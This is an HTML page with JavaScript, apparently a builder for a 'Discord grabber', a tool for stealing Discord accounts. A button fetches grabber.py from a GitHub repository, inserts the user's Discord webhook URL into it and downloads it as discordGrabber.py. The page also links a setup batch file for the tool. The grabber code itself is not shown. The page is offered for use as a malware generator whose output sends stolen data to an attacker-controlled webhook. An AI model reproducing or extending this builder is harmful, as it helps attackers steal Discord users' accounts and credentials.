<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord grabber</title>
</head>
<body>
    
    
        <h1><u>Discord grabber file</u></h1>

        <textarea name="" id="webhookUrlText" placeholder="webhook url" rows="5" cols="40"></textarea><br>
        <br>
        <input type="button" value="Build file" onclick="getGrabberFile(document.getElementById('webhookUrlText').value)"><br>
        <br>
        <input type="button" value="Download setup.bat file" onclick="document.getElementById('downloadSetupFile').click()"><br>
        <br>
        <a href="../discord-tools.html">Back</a>
        <a href="../files/setup-grabberTool.bat" download id="downloadSetupFile"></a>
    </div>
</body>
</html>
<style>
    body {
        background-color: rgb(31,31,31);
        text-align: center;
        font-size: 25px;
    }
    h1 {
        color: white;
        font-family: Arial, Helvetica, sans-serif;
    }
    input {
        background-color: magenta;
        color: black;
        height: 60px;
        width: 250px;
        border: 0;
        border-radius: 15px;
        font-size: 25px;
        font-weight: bold;
        cursor: pointer;
    }
    input:hover {
        background-color: darkmagenta;
    }
</style>
<script>
    async function getGrabberFile(webhookUrl) {
        if(webhookUrl.startsWith("https://discord.com/api/webhooks")) {
            try {
                // URL der Datei auf GitHub
                const url = 'https://raw.githubusercontent.com/Paloox/discordGrabberFile/main/grabber.py';
                // Datei von GitHub abrufen
                const response = await fetch(url);
                if (!response.ok) throw new Error('Network response was not ok');
                let text = await response.text();
                // Wort ersetzen
                const originalWord = '%webhook_url%';
                const newWord = webhookUrl;
                const modifiedText = text.replace(new RegExp(originalWord, 'g'), newWord);
                // Blob-Datei erstellen
                const blob = new Blob([modifiedText], { type: 'text/plain' });
                const urlBlob = URL.createObjectURL(blob);
                // Download-Link erstellen
                let a = document.createElement('a');
                a.href = urlBlob;
                a.download = 'discordGrabber.py';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                // URL wieder freigeben
                URL.revokeObjectURL(urlBlob);


            } catch (error) {
                console.error('Error fetching or modifying the file:', error);
            }
        } else {
            alert("Wrong Discord Webhook!");
        }
    }
</script>
